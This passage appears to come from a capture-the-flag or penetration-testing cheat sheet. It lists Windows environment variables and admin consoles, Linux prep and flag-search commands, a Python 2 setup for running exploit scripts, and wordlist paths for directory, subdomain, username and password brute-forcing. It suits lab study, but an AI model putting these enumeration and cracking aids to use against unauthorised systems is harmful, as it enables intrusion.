| %APPDATA%                 | User's roaming application data directory              | C:\Users\username\AppData\Roaming |
| %LOCALAPPDATA%            | User's local application data directory                | C:\Users\username\AppData\Local |
| %TEMP% or %TMP%           | User's temporary files directory                       | C:\Users\username\AppData\Local\Temp |
| %HOMEDRIVE%               | Drive letter of the user's home directory              | C:                          |
| %HOMEPATH%                | Path to the user's home directory                      | \Users\username             |
| %PATH%                    | Semicolon-separated list of executable search paths    | C:\Windows;C:\Windows\System32 |
| %PATHEXT%                 | Semicolon-separated list of executable file extensions | .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC |
| %PUBLIC%                  | Path to the public user directory                      | C:\Users\Public             |
| %USERNAME%                | The name of the current user                           | username                    |
| %COMPUTERNAME%            | The name of the computer                               | DESKTOP-XXXXXX              |

### ⚙️ System Settings

| Command | Utility | Description |
|---|---|---|
| appwiz.cpl | Programs and Features | Uninstall or change programs |
| certmgr.msc | Certificate Manager | Manage user and computer certificates |
| compmgmt.msc | Computer Management | A collection of administrative tools |
| control /name Microsoft.WindowsUpdate | Windows Update | Opens the Windows Update settings page |
| control.exe | Control Panel | Opens the main Control Panel window |
| devmgmt.msc | Device Manager | Manage hardware devices and drivers |
| diskmgmt.msc | Disk Management | Manage disk drives and partitions |
| dsa.msc | Active Directory Users & Computers| Manage users, groups, and computers in a domain |
| eventvwr.msc | Event Viewer | View system event logs |
| gpedit.msc | Local Group Policy Editor | Manage local security and user settings |
| gpmc.msc | Group Policy Management Console | Manage Group Policy in an Active Directory forest |
| lusrmgr.msc | Local Users and Groups | Manage local user accounts and groups |
| mmc | Microsoft Management Console | Create custom administrative consoles |
| msconfig | System Configuration | Manage boot options and startup programs |
| msinfo32 | System Information | View detailed system hardware and software info |
| ncpa.cpl | Network Connections | View and manage network adapters |
| perfmon.msc | Performance Monitor | Monitor system performance |
| regedit | Registry Editor | Edit the Windows registry |
| secpol.msc | Local Security Policy | Manage local security settings |
| services.msc | Services | Manage system services |
| taskmgr | Task Manager | Monitor system processes and performance |
| WF.msc | Windows Defender Firewall | Configure advanced firewall settings |

# 📚 Resources

## ⚙️ Prep Commands

```bash
# Add HOST for local DNS resolution in /etc/hosts file
echo '<TARGET_IP> <TARGET_HOST>' | sudo tee -a /etc/hosts
```

## 🎯 EZ Wins & Searching Info
```bash
# Use zbarimg to scan a QR code from an image file
sudo apt-get install -y zbar-tools
zbarimg <QR_CODE>

# Use ltrace to trace library calls of an executable
ltrace <EXE_FILE>

# Stegohide
steghide info <FILE>

# EXIF data
exiftool -a -G <FILE>

# Search for easy flags
sudo find / -type f \( -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) 2>/dev/null
```

## 🐍 Run Python2 Scripts

```bash
# --- Step 1: Install Python 2 and its pip package manager ---
echo "[*] Ensuring python2 and pip2 are installed..."
sudo apt-get update
sudo apt-get install -y python2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
echo "[+] Pip for Python 2 installed."

# --- Step 2: Upgrade pip and setuptools to prevent dependency errors ---
echo "[*] Upgrading pip and setuptools for Python 2..."
sudo python2 -m pip install --upgrade pip setuptools
echo "[+] Core packages upgraded."

# --- Step 3: Install virtualenv for Python 2 ---
echo "[*] Installing virtualenv for Python 2..."
sudo python2 -m pip install virtualenv
echo "[+] virtualenv installed."

# --- Step 4: Create the virtual environment using the failsafe method ---
echo "[*] Creating the Python 2 virtual environment in './py2-env'..."
python2 -m virtualenv py2-env
echo "[+] Environment 'py2-env' created successfully."

# --- Step 5: Provide instructions on how to activate and use the environment ---
echo -e "\n[!] SETUP COMPLETE. To use the environment, run the following commands:"
echo "    source py2-env/bin/activate"
echo "    pip install <required_packages>"
echo "    python <your_exploit.py>"
echo "    deactivate"
```

## 📝 Wordlists

### 🌐 Web Directory & File Enumeration (Gobuster, ffuf)
*   **Best All-Around:** `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
*   **Fastest:** `/usr/share/seclists/Discovery/Web-Content/common.txt`
*   **Most Thorough:** `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

### 🔓 Password Cracking & Brute-Forcing (Hydra, John, Hashcat)
*   **Primary (Must-Use):** `/usr/share/wordlists/rockyou.txt`
    *   **Note:** Decompress first with `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`

### 🌐 Subdomain Enumeration (ffuf, gobuster vhost)
*   **Best All-Around:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
*   **Fastest:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

### 👤 Username Enumeration
*   **General Shortlist:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
*   **Default Credentials:** `/usr/share/seclists/Usernames/cirt-default-usernames.txt`
*   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`